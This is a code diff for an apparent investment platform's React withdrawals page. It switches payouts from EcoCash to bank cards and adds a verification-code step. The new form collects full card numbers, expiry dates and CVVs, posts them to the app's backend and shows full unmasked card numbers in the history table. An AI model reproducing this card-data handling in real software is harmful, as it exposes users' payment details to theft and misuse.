@@ -4,11 +4,12 @@ import { useState, useEffect } from 'react'
 import { useRouter } from 'next/navigation'
 import { api } from '@/lib/api'
 import toast from 'react-hot-toast'
-import { Wallet, ArrowUpRight, Landmark, Hash } from 'lucide-react'
+import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Smartphone } from 'lucide-react'
 import { ConfirmModal } from '@/components/ConfirmModal'
 import { SuccessModal } from '@/components/SuccessModal'
 
-type WithdrawalStatus = 'WITHDRAWAL_PROCCESSING' | 'WITHDRAWN' | 'REJECTED'
+type WithdrawalStatus = 'WAITING_FOR_VERIFICATION' | 'WITHDRAWAL_PROCCESSING' | 'WITHDRAWN' | 'REJECTED'
+
 const WITHDRAWAL_FEE_PERCENT = 0.02
 const WITHDRAWAL_FEE_MIN = 1
 const WITHDRAWAL_FEE_MAX = 5
@@ -18,6 +19,11 @@ const getWithdrawalFee = (amount: number): number => {
   return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
 }
 
+const formatCardNumber = (value: string) => {
+  const numbers = value.replace(/\D/g, '').slice(0, 16)
+  return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
+}
+
 export default function WithdrawalsPage() {
   const [withdrawals, setWithdrawals] = useState<any[]>([])
   const [investments, setInvestments] = useState<any[]>([])
@@ -25,9 +31,11 @@ export default function WithdrawalsPage() {
   const [showForm, setShowForm] = useState(false)
   const [showConfirm, setShowConfirm] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
-  const [confirmAction, setConfirmAction] = useState<'withdraw' | 'invest' | null>(null)
+  const [showVerify, setShowVerify] = useState(false)
+  const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
+  const [verificationCode, setVerificationCode] = useState('')
   const [availableBalance, setAvailableBalance] = useState(0)
-  const [formData, setFormData] = useState({ investmentId: '', amount: '', method: 'ECOCASH', ecocashNumber: '', walletAddress: '' })
+  const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '', verifyMethod: 'email' as 'email' | 'sms' })
   const router = useRouter()
 
   useEffect(() => {
@@ -66,6 +74,10 @@ export default function WithdrawalsPage() {
       toast.error('Amount must be at least $1')
       return
     }
+    if (!formData.billingAddress || formData.billingAddress.length < 5) {
+      toast.error('Billing address required')
+      return
+    }
     const fee = getWithdrawalFee(amount)
     const maxWithdrawable = availableBalance - fee
     if (amount > maxWithdrawable) {
@@ -76,17 +88,30 @@ export default function WithdrawalsPage() {
     setShowConfirm(true)
   }
 
+  const [confirmAction, setConfirmAction] = useState<'withdraw' | 'invest' | null>(null)
+
   const handleConfirm = async () => {
     try {
       const payload = {
-        ...formData,
+        investmentId: formData.investmentId,
         amount: Number(formData.amount),
+        method: 'CARD' as const,
+        cardNumber: formData.cardNumber.replace(/\s/g, ''),
+        cardholderName: formData.cardholderName,
+        expiryDate: formData.expiryDate,
+        cvv: formData.cvv,
+        billingAddress: formData.billingAddress,
+        verifyMethod: formData.verifyMethod,
       }
-      await api.post('withdrawals', payload)
+      const { data } = await api.post('withdrawals', payload)
       setShowForm(false)
       setShowConfirm(false)
       setConfirmAction(null)
-      setShowSuccess(true)
+      if (data.success && data.data?.id) {
+        setPendingWithdrawalId(data.data.id)
+        setShowVerify(true)
+        toast.success(`Verification code sent via ${formData.verifyMethod === 'sms' ? 'SMS' : 'email'}`)
+      }
       fetchWithdrawals()
     } catch (err: any) {
       toast.error(err.response?.data?.message || 'Failed')
@@ -95,7 +120,25 @@ export default function WithdrawalsPage() {
     }
   }
 
+  const handleVerify = async () => {
+    if (!pendingWithdrawalId || !verificationCode) {
+      toast.error('Please enter verification code')
+      return
+    }
+    try {
+      await api.put(`withdrawals/${pendingWithdrawalId}/verify`, { verificationCode })
+      setShowVerify(false)
+      setVerificationCode('')
+      setPendingWithdrawalId(null)
+      setShowSuccess(true)
+      fetchWithdrawals()
+    } catch (err: any) {
+      toast.error(err.response?.data?.message || 'Invalid verification code')
+    }
+  }
+
   const statusColors: Record<WithdrawalStatus, string> = {
+    WAITING_FOR_VERIFICATION: 'bg-blue-50 text-blue-700 border border-blue-200',
     WITHDRAWAL_PROCCESSING: 'bg-yellow-50 text-yellow-700 border border-yellow-200',
     WITHDRAWN: 'bg-green-50 text-green-700 border border-green-200',
     REJECTED: 'bg-red-50 text-red-700 border border-red-200',
@@ -119,7 +162,7 @@ export default function WithdrawalsPage() {
 
       {showForm && (
         <form onSubmit={handleSubmit} className="rounded-3xl border bg-white p-6 shadow-sm">
-          <h3 className="text-lg font-semibold text-gray-900 mb-4">Request Withdrawal</h3>
+          <h3 className="text-lg font-semibold text-gray-900 mb-4">Request Withdrawal to Card</h3>
           <div className="grid gap-4 sm:grid-cols-2">
             <div>
               <label className="block text-sm font-medium text-gray-700">Investment</label>
@@ -150,28 +193,111 @@ export default function WithdrawalsPage() {
               />
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-700">Method</label>
-              <select
-                value={formData.method}
-                onChange={(e) => setFormData({ ...formData, method: e.target.value })}
-                className="mt-1 w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
-              >
-                <option value="ECOCASH">EcoCash</option>
-              </select>
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-700">EcoCash Number</label>
+              <label className="block text-sm font-medium text-gray-700">Card Number</label>
               <div className="relative mt-1">
-                <Landmark className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
+                <CreditCard className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                 <input
-                  type="tel"
-                  value={formData.ecocashNumber}
-                  onChange={(e) => setFormData({ ...formData, ecocashNumber: e.target.value })}
-                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
+                  type="text"
+                  value={formatCardNumber(formData.cardNumber)}
+                  onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value).replace(/\s/g, '') })}
+                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 font-mono"
                   required
-                  placeholder="+263..."
+                  placeholder="1234 5678 9012 3456"
+                  maxLength={19}
                 />
               </div>
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-gray-700">Cardholder Name</label>
+              <div className="relative mt-1">
+                <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
+                <input
+                  type="text"
+                  value={formData.cardholderName}
+                  onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
+                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
+                  required
+                  placeholder="John Doe"
+                />
+              </div>
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-gray-700">Expiry Date (MM/YY)</label>
+              <div className="relative mt-1">
+                <Calendar className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
+                <input
+                  type="text"
+                  value={formData.expiryDate}
+                  onChange={(e) => {
+                    let v = e.target.value.replace(/\D/g, '')
+                    if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4)
+                    setFormData({ ...formData, expiryDate: v.slice(0, 5) })
+                  }}
+                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
+                  required
+                  placeholder="12/25"
+                  maxLength={5}
+                />
+              </div>
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-gray-700">CVV</label>
+              <div className="relative mt-1">
+                <Lock className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
+                <input
+                  type="text"
+                  value={formData.cvv}
+                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
+                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
+                  required
+                  placeholder="123"
+                  maxLength={3}
+                />
+              </div>
+            </div>
+            <div className="sm:col-span-2">
+              <label className="block text-sm font-medium text-gray-700">Billing Address</label>
+              <div className="relative mt-1">
+                <MapPin className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
+                <input
+                  type="text"
+                  value={formData.billingAddress}
+                  onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
+                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
+                  required
+                  placeholder="Street, Apt, City, Country"
+                />
+              </div>
+              <p className="mt-1 text-xs text-gray-500">Must match card billing address for verification</p>
+            </div>
+            <div className="sm:col-span-2">
+              <label className="block text-sm font-medium text-gray-700">Verification Method</label>
+              <div className="mt-2 flex gap-4">
+                <label className="flex items-center gap-2 cursor-pointer">
+                  <input
+                    type="radio"
+                    name="verifyMethod"
+                    value="email"
+                    checked={formData.verifyMethod === 'email'}
+                    onChange={(e) => setFormData({ ...formData, verifyMethod: 'email' })}
+                    className="text-brand-blue focus:ring-brand-blue"
+                  />
+                  <span className="text-sm text-gray-700">Email</span>
+                </label>
+                <label className="flex items-center gap-2 cursor-pointer">
+                  <input
+                    type="radio"
+                    name="verifyMethod"
+                    value="sms"
+                    checked={formData.verifyMethod === 'sms'}
+                    onChange={(e) => setFormData({ ...formData, verifyMethod: 'sms' })}
+                    className="text-brand-blue focus:ring-brand-blue"
+                  />
+                  <Smartphone size={16} className="text-gray-500" />
+                  <span className="text-sm text-gray-700">SMS</span>
+                </label>
+              </div>
+              <p className="mt-1 text-xs text-gray-500">Code will be sent via selected method to confirm ownership</p>
             </div>
           </div>
           <div className="mt-4 flex gap-3">
@@ -186,6 +312,42 @@ export default function WithdrawalsPage() {
             Available: ${availableBalance.toLocaleString()} | Fee: {formData.amount ? `$${getWithdrawalFee(Number(formData.amount)).toFixed(2)}` : '-'} (2%, min $1, max $5)
           </p>
         </form>
+      )}
+
+      {showVerify && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
+          <div className="rounded-3xl border bg-white p-6 shadow-sm w-full max-w-md mx-4">
+            <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
+              <Shield className="h-5 w-5 text-brand-blue" />
+              Verify Withdrawal
+            </h3>
+            <p className="text-sm text-gray-600 mb-4">
+              Enter the 6-digit verification code sent via {formData.verifyMethod === 'sms' ? 'SMS' : 'email'} to confirm this card withdrawal.
+            </p>
+            <input
+              type="text"
+              value={verificationCode}
+              onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+              className="w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 text-center text-lg font-mono"
+              placeholder="Enter 6-digit code"
+              maxLength={6}
+            />
+            <div className="mt-4 flex gap-3">
+              <button
+                onClick={handleVerify}
+                className="flex-1 rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-5 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90"
+              >
+                Verify
+              </button>
+              <button
+                onClick={() => setShowVerify(false)}
+                className="rounded-xl border border-gray-200 px-5 py-2 text-sm text-gray-700 hover:bg-gray-50"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
       )}
 
       <ConfirmModal
@@ -209,7 +371,7 @@ export default function WithdrawalsPage() {
               <th className="px-5 py-3">Investment</th>
               <th className="px-5 py-3">Amount</th>
               <th className="px-5 py-3">Method</th>
-              <th className="px-5 py-3">Details</th>
+              <th className="px-5 py-3">Card Details</th>
               <th className="px-5 py-3">Status</th>
             </tr>
           </thead>
@@ -220,7 +382,9 @@ export default function WithdrawalsPage() {
                 <td className="px-5 py-3 text-sm text-gray-900 font-medium">{w.investmentId}</td>
                 <td className="px-5 py-3 text-sm font-medium text-gray-900">${Number(w.amount).toLocaleString()}</td>
                 <td className="px-5 py-3 text-sm text-gray-600">{w.method}</td>
-                <td className="px-5 py-3 text-sm text-gray-600">{w.ecocashNumber || w.walletAddress || '-'}</td>
+                <td className="px-5 py-3 text-sm text-gray-600 font-mono">
+                  {w.cardNumber ? `${formatCardNumber(w.cardNumber)}` : '-'}
+                </td>
                 <td className="px-5 py-3">
                   <span className={`inline-block rounded-full px-2.5 py-1 text-xs font-medium ${statusColors[w.status as WithdrawalStatus]}`}>
                     {w.status.replace(/_/g, ' ')}
